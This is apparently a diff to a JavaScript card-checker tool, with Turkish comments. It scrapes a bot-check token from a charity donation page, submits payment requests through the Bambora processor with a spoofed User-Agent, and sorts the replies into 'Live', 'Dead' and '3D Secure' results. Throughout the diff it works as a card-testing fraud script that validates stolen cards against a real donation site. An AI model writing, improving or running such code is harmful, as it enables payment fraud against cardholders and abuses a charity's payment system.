@@ -78,19 +78,24 @@
                 });
                 const tokenJson = await tokenResp.json();
                 const token = tokenJson.token;
-                if (!token) return 'Declined! (token error)';
+                if (!token) return '❌ Token alınamadı!';
 
                 // 2. Bot check al
-                const session = await fetch('https://donate.kinvia.ca/single.php', {
-                    method: 'GET',
-                    headers: { 
-                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-                        'Cache-Control': 'no-cache'
-                    }
-                });
-                const html = await session.text();
-                const botCheckMatch = html.match(/name="bot_check"\s+value="([^"]*)"/);
-                const botCheck = botCheckMatch ? botCheckMatch[1] : '';
+                let botCheck = '';
+                try {
+                    const session = await fetch('https://donate.kinvia.ca/single.php', {
+                        method: 'GET',
+                        headers: { 
+                            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+                            'Cache-Control': 'no-cache'
+                        }
+                    });
+                    const html = await session.text();
+                    const botCheckMatch = html.match(/name="bot_check"\s+value="([^"]*)"/);
+                    botCheck = botCheckMatch ? botCheckMatch[1] : '';
+                } catch(e) {
+                    botCheck = '';
+                }
 
                 // 3. Ödeme isteği
                 const postData = new URLSearchParams();
@@ -152,24 +157,24 @@
                 });
                 const respText = await resp.text();
 
-                // Sonuç kontrolü - Daha hassas
+                // Sonuç analizi
                 if (respText.includes('TRANSACTION UNSUCCESSFUL') || 
                     respText.includes('Oh no!') ||
                     respText.includes('unable to obtain authorization') ||
                     respText.includes('Declined')) {
-                    return 'Declined! (transaction unsuccessful)';
+                    return '❌ Dead (Bambora)';
                 } else if (respText.includes('Thank you') || 
                           respText.includes('success') || 
                           respText.includes('received') ||
                           respText.includes('Your donation')) {
-                    return 'Approved! (charged)';
+                    return '✅ Live (Bambora)';
                 } else if (respText.includes('3D Secure') || respText.includes('3DS')) {
-                    return '3D Secure! (3DS)';
+                    return '🔐 3D Secure (Bambora)';
                 } else {
-                    return 'Declined! (unknown response)';
+                    return '❌ Bilinmeyen yanıt';
                 }
             } catch (err) {
-                return 'Error: ' + err.message.slice(0, 50);
+                return '❌ Post Hatası: ' + err.message.slice(0, 50);
             }
         }
     };
